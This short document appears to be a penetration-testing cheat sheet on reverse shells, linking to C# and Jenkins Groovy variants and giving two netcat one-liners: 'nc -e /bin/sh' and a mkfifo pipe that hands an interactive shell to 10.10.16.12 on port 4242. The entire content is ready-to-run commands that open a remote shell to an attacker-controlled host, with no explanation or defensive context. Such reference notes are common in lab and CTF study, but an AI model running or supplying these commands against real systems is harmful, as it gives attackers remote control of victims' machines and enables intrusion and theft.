# Reverse Shells

- [C Sharp Reverse](./csharp-reverse.cs)
- [Jenkins Groovy Reverse](./jenkins-reverse.md)

## Netcat with -e option
```
$nc -e /bin/sh 10.10.16.12 4242
```


## Netcat without Netcat
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/sh -i 2>&1|nc 10.10.16.12 4242 >/tmp/f
```